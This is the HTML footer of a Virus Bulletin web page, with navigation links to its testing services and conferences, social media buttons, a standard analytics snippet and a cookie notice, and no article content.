<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td></td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td></td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td></td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td></td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">1989-2022 Virus Bulletin.<a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a><a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a><a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>